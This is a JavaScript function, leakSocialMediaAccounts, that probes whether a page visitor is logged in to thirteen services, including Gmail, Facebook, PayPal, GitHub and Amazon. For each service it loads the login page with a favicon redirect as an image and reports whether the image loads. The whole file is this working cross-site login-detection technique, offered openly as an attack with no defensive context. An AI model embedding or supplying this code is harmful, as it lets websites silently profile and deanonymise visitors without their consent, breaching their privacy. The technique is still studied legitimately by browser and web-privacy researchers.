var leakSocialMediaAccounts = function(callback) {
    var platforms = [ {
        domain: "https://twitter.com",
        redirect: "/login?redirect_after_login=%2Ffavicon.ico",
        name: "Twitter"
    }, {
        domain: "https://www.facebook.com",
        redirect: "/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F_rdr%3Dp",
        name: "Facebook"
    }, {
        domain: "https://accounts.google.com",
        redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
        name: "Gmail"
    }, {
        domain: "https://accounts.google.com",
        redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
        name: "Youtube"
    }, {
        domain: "https://login.skype.com",
        redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
        name: "Skype"
    },  {
        domain: "https://www.spotify.com",
        redirect: "/en/login/?forward_url=https%3A%2F%2Fwww.spotify.com%2Ffavicon.ico",
        name: "Spotify"
    },  {
        domain: "https://www.expedia.de",
        redirect: "/user/login?ckoflag=0&selc=0&uurl=qscr%3Dreds%26rurl%3D%252Ffavicon.ico",
        name: "Expedia"
    },  {
        domain: "https://www.amazon.com",
        redirect: "/ap/signin/178-4417027-1316064?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=10000000&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico",
        name: "Amazon.com"
    },   {
        domain: "https://github.com",
        redirect: "/login?return_to=https%3A%2F%2Fgithub.com%2Ffavicon.ico%3Fid%3D1",
        name: "Github"
    },  {
        domain: "https://slack.com",
        redirect: "/checkcookie?redir=https%3A%2F%2Fslack.com%2Ffavicon.ico%23",
        name: "Slack"
    },  {
        domain: "https://www.paypal.com",
        redirect: "/signin?returnUri=https://t.paypal.com/ts?v=1.0.0",
        name: "Paypal"
    }, {
        domain: "https://www.airbnb.com",
        redirect: "/login?redirect_params[action]=favicon.ico&redirect_params[controller]=home",
        name: "Airbnb"
    }, {
        domain: "https://leetcode.com",
        redirect: "/accounts/login?next=/favicon.ico",
        name: "leetcode"
    }];

    platforms.forEach(function(network) {
        var img = document.createElement('img');
        img.src = network.domain + network.redirect;
        img.onload = function() {
            callback(network, true);
        };
        img.onerror = function() {
            callback(network, false);
        };
    });
};

